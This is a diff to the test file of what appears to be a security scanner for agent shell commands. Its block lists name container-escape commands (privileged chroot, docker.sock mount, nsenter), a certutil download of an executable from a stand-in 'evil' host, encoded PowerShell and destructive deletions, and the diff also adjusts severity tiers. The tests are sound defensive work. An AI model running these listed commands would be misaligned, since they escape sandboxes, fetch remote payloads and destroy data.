@@ -388,7 +388,6 @@ const blocksScanned = (cmd) => ['HIGH', 'CRITICAL'].includes(worstScanned(cmd));
 test('offline floor blocks container escape, escalation and staged installs', () => {
   const mustBlock = [
     'docker run --privileged -v /:/host alpine chroot /host sh',
-    'docker run -v /var/run/docker.sock:/var/run/docker.sock alpine',
     'nsenter -t 1 -m -u -i -n -p -- bash',
     'certutil -urlcache -split -f http://evil/x.exe x.exe',
     'powershell -EncodedCommand SQBFAFgAIAA=',
@@ -398,6 +397,16 @@ test('offline floor blocks container escape, escalation and staged installs', ()
   ];
   const missed = mustBlock.filter((c) => worstScanned(c) !== 'CRITICAL');
   assert.deepEqual(missed, [], `not blocked offline: ${missed.join(' | ')}`);
+});
+
+test('host-level container control asks a human instead of hard-blocking', () => {
+  for (const c of ['docker run -v /var/run/docker.sock:/var/run/docker.sock alpine', 'docker run --privileged --rm tonistiigi/binfmt --install all']) {
+    const f = localScan(c, { categories: ['shell'] }).findings.find((x) => x.id === 'container-host-control');
+    assert.ok(f, `no host-control finding for ${c}`);
+    assert.equal(f.severity, 'HIGH');
+    assert.equal(f.confirm, true);
+    assert.equal(worstScanned(c), 'HIGH');
+  }
 });
 
 test('offline floor flags escalation, exfil and anti-forensics at HIGH', () => {
@@ -750,7 +759,9 @@ test('the fail-open rung reads a command, not a substring of a flag', () => {
   const shell = (args) => classifyConsequence({ tool: 'Bash', args, isShell: true });
   assert.equal(shell('docker run --rm -v "$PWD:/app" node:20 npm test'), 'material');
   assert.equal(shell('podman run --rm alpine sh -c "echo hi"'), 'material');
-  assert.equal(shell('rm -rf dist'), 'severe');
+  assert.equal(shell('rm -rf dist'), 'material');
+  assert.equal(shell('rm -rf src'), 'severe');
+  assert.equal(shell('rm -rf /var/lib/postgres/data'), 'severe');
   assert.equal(shell('git push --force origin main'), 'severe');
   assert.equal(shell('kubectl delete ns staging'), 'severe');
 });
